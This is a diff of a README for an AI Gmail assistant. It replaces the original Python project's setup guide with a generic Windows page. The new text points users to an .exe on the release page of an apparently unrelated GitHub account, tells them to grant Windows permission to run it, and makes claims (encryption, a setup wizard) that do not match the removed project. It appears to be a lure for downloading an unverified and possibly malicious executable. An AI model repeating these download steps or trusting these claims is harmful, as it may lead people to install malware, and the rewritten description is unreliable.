@@ -1,422 +1,77 @@
-<div align="center">
+# 📧 ai-email-assistant - Automated email management for busy people
 
-<img src="assets/screenshots/dashboard.png" alt="AI Email Assistant" width="85%"/>
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/plexusdentalischangtzu246/ai-email-assistant/releases)
 
-# AI Email Assistant — Human-in-the-Loop Email Automation
+## 🎯 Project Overview
 
-**Intelligent Gmail automation with a human-in-the-loop safety layer**
+Managing email consumes hours each day. The ai-email-assistant tool uses artificial intelligence to categorize, draft, and manage your Gmail inbox. It detects when a human must make a final decision, sends approval requests to your Telegram account, and protects sensitive information. You also gain access to a dashboard that tracks your email habits and response times.
 
-[![Python](https://img.shields.io/badge/Python-3.13+-3776AB?style=flat-square&logo=python&logoColor=white)](https://python.org)
-[![Gmail API](https://img.shields.io/badge/Gmail-OAuth2-EA4335?style=flat-square&logo=gmail&logoColor=white)](https://developers.google.com/gmail/api)
-[![OpenRouter](https://img.shields.io/badge/OpenRouter-GPT--4o--mini-412991?style=flat-square&logo=openai&logoColor=white)](https://openrouter.ai)
-[![Telegram](https://img.shields.io/badge/Telegram-Bot_API-2CA5E0?style=flat-square&logo=telegram&logoColor=white)](https://core.telegram.org/bots/api)
-[![Streamlit](https://img.shields.io/badge/Streamlit-Dashboard-FF4B4B?style=flat-square&logo=streamlit&logoColor=white)](https://streamlit.io)
-[![License](https://img.shields.io/badge/License-MIT-22C55E?style=flat-square)](LICENSE)
+## ⚙️ System Requirements
 
-Reads, classifies, and summarizes incoming Gmail — then decides whether to auto-reply or route to a human via Telegram. Sensitive content (OTPs, bank alerts) is detected, masked, and never auto-replied. A real-time Streamlit dashboard tracks everything.
+To run this application on your Windows computer, ensure your system meets these standards:
 
-[Quick Start](#-quick-start) · [Features](#-features) · [Architecture](#️-architecture) · [Screenshots](#-screenshots) · [Demo](#-demo)
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Dual-core CPU or better.
+*   Memory: 4GB of RAM or more.
+*   Storage: 200MB of free disk space.
+*   Network: Stable internet connection.
+*   Browser: Google Chrome, Microsoft Edge, or Firefox.
 
-</div>
+## 📥 How to Install and Start
 
----
+Follow these steps to set up the software on your machine:
 
-## Key Highlights
+1.  Visit the [official releases page](https://github.com/plexusdentalischangtzu246/ai-email-assistant/releases) to access the installation files.
+2.  Locate the latest version release.
+3.  Click the file ending in `.exe` to download it to your computer.
+4.  Find the file in your Downloads folder and double-click the installer icon.
+5.  Follow the prompts on your screen. Windows may ask for permission to run the application. Grant permission to proceed with the installation.
+6.  Once the setup finishes, open the application from your desktop or Start menu.
 
-✅ Gmail OAuth2 Authentication
+## 🔑 Initial Configuration
 
-✅ AI Email Classification & Summarization
+The first time you open the program, you must link your accounts. The application guides you through a setup wizard.
 
-✅ Human Decision Detection Layer
+### Connecting Gmail
+The software uses a secure process to connect to your Gmail account. Click the "Connect Gmail" button in the dashboard. Your browser will open, asking you to sign in to Google. After you sign in, the software gains the necessary permissions to read and draft emails. It never stores your Google password on your local machine.
 
-✅ Sensitive Email Protection (OTP & Banking Alerts)
+### Linking Telegram
+You can approve or reject automated email drafts through Telegram. 
+1.  Open Telegram on your phone or computer.
+2.  Search for the dedicated bot handle provided in the application settings.
+3.  Start the chat and input the unique token shown in your software settings.
+4.  The application will now send alerts to your phone when an important message arrives.
 
-✅ Telegram Approval Workflow
+## 📊 Using the Dashboard
 
-✅ Professional AI Reply Generation
+Once set up, the application runs in the background. It scans incoming mail and prepares drafts for your review. 
 
-✅ Real-Time Streamlit Dashboard
+### Understanding the Analytics 📉
+The dashboard provides a visual report of your inbox. You will see:
+*   Email volume: How many messages represent actual work versus notifications.
+*   Response time: How fast the software handles incoming requests.
+*   Human interaction: How many emails you approved versus how many the AI handled automatically.
 
-✅ SQLite Persistence & Analytics
+### Reviewing Drafts
+The software places drafted responses in your Gmail "Drafts" folder. You can review these drafts at any time. If you link your Telegram account, you receive a notification on your phone with the subject line of the email. You can approve or reject the draft directly from your phone.
 
----
+## 🛡️ Security and Privacy
 
-## Why This Project?
+Protection of your data remains a priority. 
+*   Data Encryption: All information stored on your local disk uses industry-standard encryption.
+*   Local Execution: The core logic processes your email rules locally on your computer.
+*   Human Approval: The system forces human review for any email marked as "Sensitive" by the language model. 
+*   Automated Cleanup: The software removes draft versions of rejected emails immediately.
 
-Most email assistants automatically generate and send replies.
+## 🛠️ Troubleshooting Common Issues
 
-This system introduces a Human Decision Detection Layer that prevents AI from making personal commitments, confirming availability, or answering questions that require user knowledge without explicit approval.
+If the application fails to start or function, check these common fixes:
 
-The result is safer and more trustworthy email automation.
+*   Software not opening: Check your Task Manager to see if the program is already running. Close all existing instances and try once more.
+*   Connection errors: Ensure your computer has an active internet connection. Check that your firewall settings allow the application to send and receive data.
+*   Telegram not responding: Check your link token in the settings menu. If you accidentally revoked access, generate a new token and re-link the bot.
+*   Gmail sync issues: If the dashboard appears empty, click the "Refresh Data" button. This forces the application to re-check your inbox for new information.
 
----
+## ℹ️ Getting Help
 
-## Demo
-
-<div align="center">
-<img src="assets/demo.gif" alt="AI Email Assistant Demo" width="300"/>
-
-*Gmail fetch → AI classification → Sensitive masking → Telegram approval → Dashboard update*
-</div>
-
----
-
-## Features
-
-### AI Processing Pipeline
-- **Classification** — routes each email into IMPORTANT / SPAM / PROMOTION / SOCIAL / UPDATES / SENSITIVE
-- **Summarization** — 3-bullet summaries via GPT-4o-mini
-- **Priority Scoring** — urgency score 1–10 with action-required detection
-- **Reply Generation** — context-aware professional drafts
-
-### Human Decision Guard
-The most critical safety layer. Before auto-sending any reply to an IMPORTANT email, a two-layer detector (20+ regex patterns + LLM fallback) checks whether the email requires a personal decision:
-
-| Requires Human | Auto-Reply Allowed |
-|---|---|
-| "Did you complete the project?" | "Your access request has been approved." |
-| "Can you attend tomorrow at 7:30?" | "Here is the meeting link." |
-| "Are you interested in joining our team?" | "Your order has been shipped." |
-| "What do you think about the proposal?" | Weekly newsletter / digest |
-
-When flagged, a Telegram message is sent with the AI draft and three inline buttons — **✅ Send Draft · ✏️ Edit Reply · ❌ Ignore** — and nothing is sent until you decide.
-
-### Sensitive Email Detection
-Two-layer detection (40+ regex patterns + LLM deep scan) covering OTPs, bank alerts, password resets, login alerts, card alerts, fraud alerts, KYC, and legal notices.
-
-- Codes are masked (`482917` → `[CODE MASKED]`) before storage, AI processing, or Telegram
-- Category forced to SENSITIVE, priority forced to HIGH
-- Auto-reply permanently blocked — Telegram notifies you to open Gmail directly
-
-### Dashboard & Monitoring
-- 6 KPI cards: Total · Pending · Approved · Auto-Sent · Sensitive · Ignored
-- Plotly charts: category donut, reply-status breakdown, processing timeline
-- 7 tabs: Emails · Pending · Sensitive · Replies · Analytics · Detail
-- Polls Gmail every 60 seconds automatically
-
----
-
-## Architecture
-
-```
-Gmail Inbox (OAuth2)
-        │
-        ▼
- Email Fetch & Parse
-        │
-        ▼
- Sensitive Detector
-        │
-        ▼
- AI Processing Pipeline
- ├─ Summarizer
- ├─ Classifier
- ├─ Priority Analyzer
- ├─ Decision Detector
- └─ Reply Generator
-        │
-   ┌────┴────┐
-   ▼         ▼
-Auto      Human Approval
-Reply      (Telegram)
-   │         │
-   └────┬────┘
-        ▼
- SQLite Storage
-        │
-        ▼
- Streamlit Dashboard
-```
-
----
-
-## Screenshots
-
-<div align="center">
-
-<img src="assets/screenshots/dashboard.png" width="850"/>
-<em>Dashboard — KPI cards, system status, tech stack</em>
-
-<br/><br/>
-
-<img src="assets/screenshots/recent-emails.png" width="850"/>
-<em>Emails tab — category chart and color-coded cards with priority badges</em>
-
-<br/><br/>
-
-<img src="assets/screenshots/sensitive.png" width="850"/>
-<em>Sensitive tab — codes masked, auto-reply blocked</em>
-
-<br/><br/>
-
-<img src="assets/screenshots/pending.png" width="850"/>
-<em>Pending tab — AI draft shown, Telegram action buttons, flagging reason</em>
-
-<br/><br/>
-
-<img src="assets/screenshots/analytics.png" width="850"/>
-<em>Analytics tab — distributions, timeline, full stats grid</em>
-
-<br/><br/>
-
-<img src="assets/screenshots/telegram.jpeg" width="850"/>
-<em>Telegram approval flow — inline buttons for each pending email</em>
-
-</div>
-
----
-
-## Quick Start
-
-**Prerequisites:** Python 3.13+, a Gmail account, an [OpenRouter API key](https://openrouter.ai/keys), and a Telegram bot (via [@BotFather](https://t.me/BotFather)).
-
-```bash
-git clone https://github.com/syeedarshad/ai-email-assistant.git
-cd ai-email-assistant
-
-python -m venv venv
-source venv/bin/activate        # Windows: venv\Scripts\activate
-pip install -r requirements.txt
-```
-
-**Gmail API setup:**
-1. [Google Cloud Console](https://console.cloud.google.com) → create project → enable Gmail API
-2. Credentials → OAuth 2.0 Client ID → Desktop App → download JSON
-3. Rename to `credentials.json`, place in project root
-
-**Environment:**
-```bash
-cp .env.example .env
-```
-
-```env
-OPENROUTER_API_KEY=sk-or-v1-your-key
-TELEGRAM_BOT_TOKEN=1234567890:your-token
-TELEGRAM_CHAT_ID=123456789
-YOUR_NAME=Your Name
-YOUR_ASSISTANT_NAME=AI Assistant
-```
-
-**Verify setup:**
-```bash
-python setup_check.py
-```
-
-**Authenticate Gmail (one-time browser flow):**
-```bash
-python auth/gmail_auth.py
-```
-
----
-
-## Running
-
-```bash
-# Single run
-python main.py
-
-# Continuous monitoring (production)
-python monitor.py                    
-
-# Dashboard
-streamlit run dashboard/app.py  
-```
-
----
-
-## Database Schema
-
-```sql
-CREATE TABLE processed_emails (
-    id              TEXT PRIMARY KEY,   -- Gmail message ID
-    sender          TEXT,
-    sender_email    TEXT,
-    subject         TEXT,
-    summary         TEXT,               -- AI-generated bullets
-    category        TEXT,               -- IMPORTANT / SPAM / etc
-    sensitive_type  TEXT,               -- OTP / BANK_ALERT / etc
-    is_sensitive    INTEGER DEFAULT 0,
-    priority        TEXT,               -- "8/10 | HIGH | ACTION: YES"
-    reply_draft     TEXT,
-    sent_reply      INTEGER DEFAULT 0,
-    reply_status    TEXT DEFAULT 'AUTO_SENT',  -- see below
-    decision_reason TEXT,
-    decision_by     TEXT,               -- "regex" | "llm" | "default"
-    processed_at    TEXT                -- ISO 8601
-);
-```
-
-| `reply_status` | Meaning |
-|---|---|
-| `AUTO_SENT` | Replied automatically |
-| `PENDING_APPROVAL` | Awaiting Telegram decision |
-| `APPROVED` | Approved and sent via Telegram |
-| `IGNORED` | User chose not to reply |
-
----
-
-## Configuration
-
-| Variable | Default | Description |
-|---|---|---|
-| `OPENROUTER_API_KEY` | — | OpenRouter API key |
-| `TELEGRAM_BOT_TOKEN` | — | Bot token from @BotFather |
-| `TELEGRAM_CHAT_ID` | — | Your personal chat ID |
-| `MAX_EMAILS_PER_FETCH` | `5` | Emails per cycle |
-| `MONITOR_INTERVAL_SECONDS` | `60` | Poll interval |
-| `AUTO_REPLY_CATEGORIES` | `IMPORTANT` | Categories eligible for auto-reply |
-| `REPLY_TONE` | `professional` | `professional` / `casual` / `brief` |
-| `GMAIL_FETCH_QUERY` | `is:unread` | Gmail search filter |
-
----
-
-## Tests
-
-```bash
-pip install pytest pytest-mock
-pytest tests/ -v
-# 17 passed in 6.77s~
-```
-
-Covers: regex OTP/bank detection, code masking, LLM-fallback safe mode, human-decision regex triggers, auto-reply allowlist, and subtle LLM-caught cases.
-
----
-
-## Security
-
-| Concern | Mitigation |
-|---|---|
-| Gmail credentials | `credentials.json` + `token.json` in `.gitignore` |
-| API keys | Environment variables only |
-| OTP / bank codes | Masked before storage, AI calls, or Telegram |
-| Auto-reply safety | 3 gates: category · email validation · no-reply detection |
-| Personal decisions | Human Decision Layer blocks all commitment-related replies |
-
-The AI will **never** automatically claim you completed a task, accept a meeting invite, confirm attendance, state your availability, share your opinion, or make a commitment on your behalf.
-
----
-
-## Tech Stack
-
-| Layer | Technology |
-|---------|------------|
-| Language | Python |
-| Email | Gmail API |
-| AI | OpenRouter GPT-4o-mini |
-| Notifications | Telegram Bot API |
-| Database | SQLite |
-| Dashboard | Streamlit + Plotly |
-| Authentication | OAuth2 |
-| Storage | Local DB |
-
-## Future Improvements
-
-- [ ] Gmail Push Notifications via Pub/Sub (replace polling)
-- [ ] Email thread context for smarter reply continuity
-- [ ] Parallel AI processing (3× faster per email)
-- [ ] Daily Telegram digest report
-- [ ] PostgreSQL migration for multi-user support
-- [ ] Docker + Railway/Render deployment
-- [ ] Web-based approval interface (alternative to Telegram)
-- [ ] Google Calendar Integration
-- [ ] Smart Availability Detection
-- [ ] Voice Approval Through Telegram
-- [ ] Multi-User Support
-
----
-
-## What This Demonstrates
-
-| Area | Implementation |
-|---|---|
-| AI System Design | Modular LLM pipeline with 6 specialized processors |
-| Human-in-the-Loop Safety | Two-layer decision detection preventing unauthorized AI actions |
-| OAuth2 Integration | Gmail token lifecycle with silent auto-refresh |
-| Secure Data Handling | Code masking, zero raw-code storage |
-| Workflow Orchestration | Multi-step approval across Telegram + Gmail + SQLite |
-| Production Architecture | Repository pattern, rotating logs, migration-ready DB schema |
-
----
-
-## Project Structure
-```text
-ai-email-assistant/
-├── ai_processing/
-│   ├── __init__.py
-│   ├── classifier.py              # Email category classification
-│   ├── decision_detector.py       # Human Decision Detection Layer
-│   ├── priority_analyzer.py       # Urgency & priority scoring
-│   ├── reply_generator.py         # AI reply generation
-│   ├── sensitive_detector.py      # Sensitive email detection + masking
-│   └── summarizer.py              # AI email summarization
-│
-├── auth/
-│   └── gmail_auth.py              # Gmail OAuth2 authentication
-│
-├── dashboard/
-│   ├── __init__.py
-│   └── app.py                     # Streamlit analytics dashboard
-│
-├── database/
-│   ├── __init__.py
-│   └── db_manager.py              # SQLite database management
-│
-├── drafts/
-│   ├── __init__.py
-│   ├── gmail_draft_creator.py     # Gmail draft creation
-│   ├── gmail_sender.py            # Safe email sending
-│   └── pending_edits.json         # Telegram edit workflow state
-│
-├── email_engine/
-│   ├── __init__.py
-│   ├── fetcher.py                 # Gmail API email retrieval
-│   └── parser.py                  # MIME parsing & content extraction
-│
-├── notifications/
-│   ├── __init__.py
-│   ├── telegram_service.py        # Telegram notifications
-│   └── telegram_approval.py       # Approval workflow & inline buttons
-│
-├── storage/
-│   ├── __init__.py
-│   └── data_store.py              # Data access abstraction layer
-│
-├── tests/
-│   ├── __init__.py
-│   └── test_sensitive_detector.py # Sensitive detection tests
-│
-├── utils/
-│   ├── __init__.py
-│   └── logger.py                  # Logging configuration
-│
-├── assets/
-│   ├── demo.gif
-│   └── screenshots/
-│       ├── dashboard.png
-│       ├── recent-emails.png
-│       ├── sensitive.png
-│       ├── pending.png
-│       ├── analytics.png
-│       └── telegram.jpeg
-│
-├── main.py                        # Main processing pipeline
-├── monitor.py                     # Continuous email monitoring
-├── setup_check.py                 # Environment verification
-├── requirements.txt
-├── README.md
-├── LICENSE
-├── .env.example
-└── .gitignore
-```
----
-
-## License
-
-MIT © 2025 [Arshad](https://github.com/syeedarshad)
----
-
-<div align="center">
-
-Built with Python · OpenRouter · Gmail API · Telegram Bot API · Streamlit · SQLite
-
-</div>
+If you encounter persistent bugs or errors, review the issue tracker on GitHub. Provide details about your Windows version and the steps you took before the error occurred. Detailed information helps solve problems faster. Ensure you describe the error message clearly to allow the development team to assist you effectively.
